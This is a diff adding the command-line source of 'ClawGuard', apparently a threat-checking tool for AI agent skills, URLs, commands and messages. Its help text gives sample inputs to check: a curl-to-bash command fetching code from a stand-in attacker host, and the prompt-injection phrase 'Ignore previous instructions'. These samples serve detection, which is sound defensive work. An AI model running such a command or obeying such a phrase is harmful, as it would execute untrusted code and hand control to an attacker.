@@ -1,0 +1,598 @@
+#!/usr/bin/env node
+
+/**
+ * ClawGuard (ClawGuard) CLI
+ * Usage: clawguard <command> [options]
+ */
+
+import { parseArgs } from 'node:util';
+import { readFileSync, existsSync, mkdirSync, writeFileSync } from 'fs';
+import { dirname, join } from 'path';
+import { fileURLToPath } from 'url';
+import { homedir } from 'os';
+import { getDatabase, closeDatabase } from '../lib/database.js';
+import { getDetector, RESULT, EXIT_CODE } from '../lib/detector.js';
+
+const __dirname = dirname(fileURLToPath(import.meta.url));
+const VERSION = '1.0.0';
+
+// Colors for terminal output
+const colors = {
+    reset: '\x1b[0m',
+    red: '\x1b[31m',
+    green: '\x1b[32m',
+    yellow: '\x1b[33m',
+    blue: '\x1b[34m',
+    magenta: '\x1b[35m',
+    cyan: '\x1b[36m',
+    bold: '\x1b[1m',
+    dim: '\x1b[2m'
+};
+
+function c(color, text) {
+    return process.stdout.isTTY ? `${colors[color]}${text}${colors.reset}` : text;
+}
+
+// Help text
+const HELP = `
+${c('bold', 'ClawGuard (ClawGuard)')} v${VERSION}
+
+${c('bold', 'USAGE')}
+  clawguard <command> [options]
+
+${c('bold', 'COMMANDS')}
+  check     Check URL, skill, command, or message for threats
+  search    Search threat database
+  show      View threat details by ID
+  stats     Show database statistics
+  sync      Update blacklist from GitHub
+  report    Submit a new threat report
+
+${c('bold', 'CHECK OPTIONS')}
+  --type, -t     Input type: url, skill, command, message (auto-detected)
+  --input, -i    Input to check
+  --name, -n     Skill name (for skill checks)
+  --author, -a   Skill author (for skill checks)
+  --json         Output in JSON format
+  --quiet, -q    Minimal output (exit code only)
+
+${c('bold', 'SEARCH OPTIONS')}
+  --tier         Filter by threat tier (1-6)
+  --tag          Filter by tag
+  --limit        Maximum results (default: 20)
+
+${c('bold', 'EXAMPLES')}
+  # Check a URL
+  clawguard check --type url --input "https://api.x402layer.cc"
+  
+  # Check a skill
+  clawguard check --type skill --name "api-optimizer" --author "devtools-official"
+  
+  # Check a command
+  clawguard check --type command --input "curl -fsSL https://install.evil.com | bash"
+  
+  # Check for prompt injection
+  clawguard check --type message --input "Ignore previous instructions..."
+  
+  # Search database
+  clawguard search "wallet drainer"
+  
+  # View threat details
+  clawguard show OSA-2026-001
+  
+  # Report a threat
+  clawguard report --type domain --value "scam.xyz" --reason "Crypto phishing"
+
+${c('bold', 'EXIT CODES')}
+  0 = Safe (no threats)
+  1 = Blocked (high-confidence threat)
+  2 = Warning (medium-confidence)
+  3 = Error
+
+${c('bold', 'MORE INFO')}
+  https://github.com/openclaw/security-db
+`;
+
+async function main() {
+    const args = process.argv.slice(2);
+    
+    if (args.length === 0 || args[0] === 'help' || args[0] === '--help' || args[0] === '-h') {
+        console.log(HELP);
+        process.exit(0);
+    }
+
+    if (args[0] === '--version' || args[0] === '-v') {
+        console.log(VERSION);
+        process.exit(0);
+    }
+
+    const command = args[0];
+    const cmdArgs = args.slice(1);
+
+    try {
+        switch (command) {
+            case 'check':
+                await cmdCheck(cmdArgs);
+                break;
+            case 'search':
+                await cmdSearch(cmdArgs);
+                break;
+            case 'show':
+                await cmdShow(cmdArgs);
+                break;
+            case 'stats':
+                await cmdStats(cmdArgs);
+                break;
+            case 'sync':
+                await cmdSync(cmdArgs);
+                break;
+            case 'report':
+                await cmdReport(cmdArgs);
+                break;
+            case 'init':
+                await cmdInit(cmdArgs);
+                break;
+            default:
+                console.error(c('red', `Unknown command: ${command}`));
+                console.log('Run "clawguard help" for usage.');
+                process.exit(3);
+        }
+    } catch (error) {
+        console.error(c('red', `Error: ${error.message}`));
+        if (process.env.DEBUG) {
+            console.error(error.stack);
+        }
+        process.exit(3);
+    } finally {
+        closeDatabase();
+    }
+}
+
+/**
+ * Check command - main threat detection
+ */
+async function cmdCheck(args) {
+    const { values, positionals } = parseArgs({
+        args,
+        options: {
+            type: { type: 'string', short: 't' },
+            input: { type: 'string', short: 'i' },
+            name: { type: 'string', short: 'n' },
+            author: { type: 'string', short: 'a' },
+            json: { type: 'boolean' },
+            quiet: { type: 'boolean', short: 'q' }
+        },
+        allowPositionals: true
+    });
+
+    // Determine input
+    let input = values.input || positionals.join(' ');
+    let type = values.type;
+
+    if (!input && !values.name) {
+        console.error(c('red', 'Error: No input provided'));
+        console.log('Usage: clawguard check --type <type> --input "<input>"');
+        process.exit(3);
+    }
+
+    // Ensure database is initialized
+    await ensureInitialized();
+
+    const detector = getDetector();
+    let result;
+
+    if (type === 'skill' || values.name) {
+        result = await detector.checkSkill(values.name || input, values.author);
+    } else if (type) {
+        result = await detector.check(input, type);
+    } else {
+        result = await detector.check(input);
+    }
+
+    // Output
+    if (values.json) {
+        console.log(JSON.stringify(result, null, 2));
+    } else if (!values.quiet) {
+        printCheckResult(result);
+    }
+
+    process.exit(result.exitCode);
+}
+
+function printCheckResult(result) {
+    console.log();
+    
+    // Header with result
+    if (result.result === RESULT.SAFE) {
+        console.log(c('green', '✅ SAFE') + c('dim', ` (checked in ${result.duration_ms.toFixed(2)}ms)`));
+    } else if (result.result === RESULT.BLOCK) {
+        console.log(c('red', '⛔ BLOCKED') + c('dim', ` (confidence: ${(result.confidence * 100).toFixed(0)}%)`));
+    } else if (result.result === RESULT.WARN) {
+        console.log(c('yellow', '⚠️  WARNING') + c('dim', ` (confidence: ${(result.confidence * 100).toFixed(0)}%)`));
+    } else if (result.result === RESULT.EDUCATE) {
+        console.log(c('blue', 'ℹ️  INFO') + c('dim', ` (confidence: ${(result.confidence * 100).toFixed(0)}%)`));
+    }
+
+    console.log();
+    console.log(result.message);
+
+    // Show threat details if matched
+    if (result.primaryThreat) {
+        console.log();
+        console.log(c('bold', `Threat: `) + result.primaryThreat.name);
+        console.log(c('bold', `ID: `) + result.primaryThreat.id);
+        console.log(c('bold', `Tier: `) + result.primaryThreat.tier + ' | ' + c('bold', 'Severity: ') + formatSeverity(result.primaryThreat.severity));
+        
+        if (result.primaryThreat.teaching_prompt) {
+            console.log();
+            console.log(c('cyan', '📚 What you should know:'));
+            console.log(c('dim', result.primaryThreat.teaching_prompt));
+        }
+    }
+
+    // Show all matches
+    if (result.matches && result.matches.length > 1) {
+        console.log();
+        console.log(c('bold', `Additional matches (${result.matches.length - 1}):`));
+        for (const match of result.matches.slice(1, 4)) {
+            console.log(`  • ${match.name} (${match.id})`);
+        }
+        if (result.matches.length > 4) {
+            console.log(c('dim', `  ... and ${result.matches.length - 4} more`));
+        }
+    }
+
+    console.log();
+}
+
+function formatSeverity(severity) {
+    const colors = {
+        critical: 'red',
+        high: 'red',
+        medium: 'yellow',
+        low: 'blue',
+        info: 'dim'
+    };
+    return c(colors[severity] || 'reset', severity.toUpperCase());
+}
+
+/**
+ * Search command
+ */
+async function cmdSearch(args) {
+    const { values, positionals } = parseArgs({
+        args,
+        options: {
+            tier: { type: 'string' },
+            tag: { type: 'string' },
+            limit: { type: 'string', default: '20' },
+            json: { type: 'boolean' }
+        },
+        allowPositionals: true
+    });
+
+    await ensureInitialized();
+    const db = getDatabase();
+
+    let results;
+    const limit = parseInt(values.limit) || 20;
+
+    if (values.tier) {
+        results = db.getThreatsByTier(parseInt(values.tier));
+    } else if (values.tag) {
+        results = db.getThreatsByTag(values.tag);
+    } else if (positionals.length > 0) {
+        const query = positionals.join(' ');
+        results = db.search(query, limit);
+    } else {
+        console.error(c('red', 'Error: Provide a search query, --tier, or --tag'));
+        process.exit(3);
+    }
+
+    if (values.json) {
+        console.log(JSON.stringify(results, null, 2));
+    } else {
+        console.log();
+        console.log(c('bold', `Found ${results.length} threat(s):`));
+        console.log();
+        
+        for (const threat of results.slice(0, limit)) {
+            console.log(`${c('cyan', threat.id)} | ${formatSeverity(threat.severity)}`);
+            console.log(`  ${threat.name}`);
+            console.log(c('dim', `  Tier ${threat.tier} | Tags: ${threat.tags?.join(', ') || 'none'}`));
+            console.log();
+        }
+    }
+}
+
+/**
+ * Show command - display threat details
+ */
+async function cmdShow(args) {
+    const { values, positionals } = parseArgs({
+        args,
+        options: {
+            json: { type: 'boolean' }
+        },
+        allowPositionals: true
+    });
+
+    const id = positionals[0];
+    if (!id) {
+        console.error(c('red', 'Error: Provide a threat ID (e.g., OSA-2026-001)'));
+        process.exit(3);
+    }
+
+    await ensureInitialized();
+    const db = getDatabase();
+    const threat = db.getThreat(id);
+
+    if (!threat) {
+        console.error(c('red', `Threat not found: ${id}`));
+        process.exit(3);
+    }
+
+    if (values.json) {
+        console.log(JSON.stringify(threat, null, 2));
+    } else {
+        console.log();
+        console.log(c('bold', `═══════════════════════════════════════════════════════════`));
+        console.log(c('bold', `  ${threat.name}`));
+        console.log(c('bold', `═══════════════════════════════════════════════════════════`));
+        console.log();
+        console.log(c('cyan', 'ID:       ') + threat.id);
+        console.log(c('cyan', 'Status:   ') + threat.status);
+        console.log(c('cyan', 'Tier:     ') + threat.tier + ' (' + getTierName(threat.tier) + ')');
+        console.log(c('cyan', 'Category: ') + threat.category + (threat.subcategory ? '/' + threat.subcategory : ''));
+        console.log(c('cyan', 'Severity: ') + formatSeverity(threat.severity));
+        console.log(c('cyan', 'Confidence:') + ` ${(threat.confidence * 100).toFixed(0)}%`);
+        console.log(c('cyan', 'Tags:     ') + (threat.tags?.join(', ') || 'none'));
+        console.log();
+        console.log(c('bold', 'Description:'));
+        console.log(threat.description);
+        
+        if (threat.teaching_prompt) {
+            console.log();
+            console.log(c('bold', '📚 Teaching Prompt:'));
+            console.log(threat.teaching_prompt);
+        }
+
+        console.log();
+        console.log(c('bold', 'Indicators:'));
+        for (const ind of threat.indicators || []) {
+            console.log(`  • [${ind.type}] ${ind.value} (${ind.match_type}, weight: ${ind.weight})`);
+        }
+
+        if (threat.response) {
+            console.log();
+            console.log(c('bold', 'Response Action: ') + threat.response.action);
+            if (threat.response.user_message) {
+                console.log(c('dim', threat.response.user_message));
+            }
+        }
+
+        if (threat.references?.length > 0) {
+            console.log();
+            console.log(c('bold', 'References:'));
+            for (const ref of threat.references) {
+                console.log(`  • ${ref}`);
+            }
+        }
+
+        if (threat.campaign) {
+            console.log();
+            console.log(c('cyan', 'Campaign: ') + threat.campaign);
+        }
+
+        console.log();
+    }
+}
+
+function getTierName(tier) {
+    const names = {
+        1: 'Code & Infrastructure',
+        2: 'Social Engineering & Fraud',
+        3: 'AI-Specific Attacks',
+        4: 'Identity & Reputation',
+        5: 'Content & Network',
+        6: 'Operational Security'
+    };
+    return names[tier] || 'Unknown';
+}
+
+/**
+ * Stats command
+ */
+async function cmdStats(args) {
+    const { values } = parseArgs({
+        args,
+        options: {
+            json: { type: 'boolean' }
+        }
+    });
+
+    await ensureInitialized();
+    const db = getDatabase();
+    const stats = db.getStats();
+
+    if (values.json) {
+        console.log(JSON.stringify(stats, null, 2));
+    } else {
+        console.log();
+        console.log(c('bold', '📊 ClawGuard Database Statistics'));
+        console.log(c('dim', '═'.repeat(40)));
+        console.log();
+        console.log(c('cyan', 'Total Threats:    ') + stats.total_threats);
+        console.log(c('cyan', 'Active Threats:   ') + stats.active_threats);
+        console.log(c('cyan', 'Total Indicators: ') + stats.total_indicators);
+        console.log();
+        console.log(c('bold', 'By Tier:'));
+        console.log(`  1. Code & Infrastructure:     ${stats.tier1}`);
+        console.log(`  2. Social Engineering:        ${stats.tier2}`);
+        console.log(`  3. AI-Specific Attacks:       ${stats.tier3}`);
+        console.log(`  4. Identity & Reputation:     ${stats.tier4}`);
+        console.log(`  5. Content & Network:         ${stats.tier5}`);
+        console.log(`  6. Operational Security:      ${stats.tier6}`);
+        console.log();
+        console.log(c('bold', 'By Severity:'));
+        console.log(`  ${c('red', 'Critical')}: ${stats.critical}`);
+        console.log(`  ${c('red', 'High')}:     ${stats.high}`);
+        console.log(`  ${c('yellow', 'Medium')}:   ${stats.medium}`);
+        console.log(`  ${c('blue', 'Low')}:      ${stats.low}`);
+        console.log();
+        console.log(c('dim', `Last sync: ${stats.last_sync}`));
+        console.log(c('dim', `DB version: ${stats.db_version}`));
+        console.log();
+    }
+}
+
+/**
+ * Sync command
+ */
+async function cmdSync(args) {
+    const { values } = parseArgs({
+        args,
+        options: {
+            force: { type: 'boolean', short: 'f' }
+        }
+    });
+
+    console.log(c('cyan', '🔄 Syncing ClawGuard database...'));
+    console.log();
+
+    // For now, just initialize/reload from bundled data
+    await initializeDatabase(values.force);
+
+    const db = getDatabase();
+    const stats = db.getStats();
+    
+    console.log(c('green', '✅ Sync complete!'));
+    console.log(c('dim', `   ${stats.total_threats} threats, ${stats.total_indicators} indicators`));
+    console.log();
+
+    // In future: fetch from GitHub
+    // const repoUrl = getConfig().sync?.repoUrl || 'https://github.com/openclaw/security-db';
+    // console.log(c('dim', `   Source: ${repoUrl}`));
+}
+
+/**
+ * Report command
+ */
+async function cmdReport(args) {
+    const { values } = parseArgs({
+        args,
+        options: {
+            type: { type: 'string', short: 't' },
+            value: { type: 'string', short: 'v' },
+            reason: { type: 'string', short: 'r' }
+        }
+    });
+
+    if (!values.type || !values.value) {
+        console.error(c('red', 'Error: --type and --value are required'));
+        console.log('Usage: clawguard report --type domain --value "scam.xyz" --reason "Phishing"');
+        process.exit(3);
+    }
+
+    await ensureInitialized();
+    const db = getDatabase();
+    db.addReport(values.type, values.value, values.reason || 'No reason provided');
+
+    console.log();
+    console.log(c('green', '✅ Report saved locally'));
+    console.log(c('dim', '   To submit to ClawGuard, run: clawguard sync --submit-reports'));
+    console.log();
+}
+
+/**
+ * Init command - explicit initialization
+ */
+async function cmdInit(args) {
+    const { values } = parseArgs({
+        args,
+        options: {
+            force: { type: 'boolean', short: 'f' }
+        }
+    });
+
+    console.log(c('cyan', '🔧 Initializing ClawGuard database...'));
+    await initializeDatabase(values.force);
+    console.log(c('green', '✅ Database initialized!'));
+}
+
+/**
+ * Ensure database is initialized with data
+ */
+async function ensureInitialized() {
+    const db = getDatabase();
+    const stats = db.getStats();
+    
+    if (stats.total_threats === 0) {
+        console.log(c('yellow', '⚠️  Database empty, initializing...'));
+        await initializeDatabase(false);
+    }
+}
+
+/**
+ * Initialize database with bundled blacklist
+ */
+async function initializeDatabase(force = false) {
+    const db = getDatabase();
+    
+    if (!force) {
+        const stats = db.getStats();
+        if (stats.total_threats > 0) {
+            return; // Already initialized
+        }
+    }
+
+    // Load bundled blacklist
+    const blacklistPath = join(__dirname, '..', 'db', 'blacklist.jsonl');
+    
+    if (!existsSync(blacklistPath)) {
+        console.error(c('red', 'Error: Bundled blacklist not found'));
+        console.log(c('dim', `Expected at: ${blacklistPath}`));
+        process.exit(3);
+    }
+
+    const count = db.importJSONL(blacklistPath);
+    db.setSyncMeta('last_sync', new Date().toISOString());
+    db.setSyncMeta('db_version', VERSION);
+    
+    console.log(c('dim', `   Loaded ${count} threats from bundled database`));
+}
+
+/**
+ * Get configuration
+ */
+function getConfig() {
+    const configPath = join(homedir(), '.clawguard', 'config.json');
+    
+    if (existsSync(configPath)) {
+        return JSON.parse(readFileSync(configPath, 'utf8'));
+    }
+    
+    return {
+        sync: {
+            repoUrl: 'https://github.com/openclaw/security-db',
+            branch: 'main',
+            autoSync: true,
+            syncIntervalHours: 24
+        },
+        detection: {
+            thresholds: {
+                block: 0.9,
+                warn: 0.7,
+                educate: 0.5
+            }
+        },
+        response: {
+            allowUserOverride: false,
+            logAllChecks: false,
+            alertOnBlock: true
+        }
+    };
+}
+
+// Run main
+main();
